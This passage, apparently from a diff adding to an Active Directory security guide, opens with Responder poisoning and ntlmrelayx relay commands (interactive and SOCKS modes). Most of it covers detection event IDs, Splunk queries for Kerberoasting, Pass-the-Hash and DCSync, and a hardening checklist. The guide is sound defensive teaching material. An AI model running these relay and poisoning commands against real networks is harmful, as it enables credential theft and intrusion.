+python3 RunFinger.py -i TARGET_SUBNET/24
+
+# Responder — NBNS/LLMNR poisoning
+responder -I eth0 -rdwv
+
+# ntlmrelayx — relay attack
+python3 ntlmrelayx.py -tf targets.txt -smb2support
+
+# Interactive session
+python3 ntlmrelayx.py -tf targets.txt -smb2support -i
+
+# Access internal network via SOCKS proxy
+python3 ntlmrelayx.py -tf targets.txt -smb2support -socks
+# → Access internal services via socks5 127.0.0.1 1080
+```
+
+---
+
+## 10. AD Defense and Detection
+
+### Key Detection Event IDs
+```
+Event ID     Description
+──────────────────────────────────────────────────────
+4624         Successful logon
+4625         Failed logon
+4648         Logon with explicit credentials (PtH detection)
+4663         Object access
+4672         Special privilege logon (administrator)
+4688         New process creation (includes command line)
+4697         Service installation
+4698         Scheduled task creation
+4719         Audit policy change
+4720         User account created
+4728         Member added to global group
+4732         Member added to local group
+4756         Member added to universal group
+4768         Kerberos TGT request (AS-REQ)
+4769         Kerberos service ticket request (TGS-REQ) → Kerberoasting
+4771         Kerberos pre-authentication failure → AS-REP Roasting
+4776         NTLM authentication attempt
+4946         Firewall rule added
+7045         New service installed → PsExec detection
+```
+
+### Detection Query Examples (Splunk)
+```
+# Detect Kerberoasting (bulk TGS requests)
+index=windows EventCode=4769 Ticket_Encryption_Type=0x17
+| stats count by Account_Name, Client_Address
+| where count > 10
+
+# Detect Pass-the-Hash (Event ID 4648)
+index=windows EventCode=4648
+| stats count by Subject_Account_Name, Target_Server_Name
+| where count > 5
+
+# Detect DCSync
+index=windows EventCode=4662
+| where Access_Mask="0x100" AND Properties IN ("*1131f6ad*","*1131f6aa*")
+| table _time, Account_Name, Object_DN
+```
+
+### AD Hardening Checklist
+```
+Account Management:
+  □ Tiered admin accounts (Tier 0/1/2)
+  □ Regularly rotate krbtgt password (twice in succession)
+  □ Use Group Managed Service Accounts (gMSA) for service accounts
+  □ Disable inactive accounts (90-day threshold)
+  □ Regularly audit AdminSDHolder object permissions
+
+Kerberos Settings:
+  □ Enforce AES256 encryption (disable RC4)
+  □ Enable pre-authentication requirement (AS-REP Roasting defense)
+  □ Remove unnecessary SPNs (Kerberoasting defense)
+
+Network:
+  □ Enforce SMB signing (NTLM relay defense)
+  □ Disable LLMNR/NetBIOS (Responder defense)
+  □ Disable Print Spooler on servers that don't need it
+
+Monitoring:
+  □ Configure SIEM alerts for the above event IDs
+  □ Detect abnormal Kerberos ticket requests
+  □ Monitor direct LDAP queries to DCs
+  □ Detect Mimikatz / LSASS access (EDR)
 ```
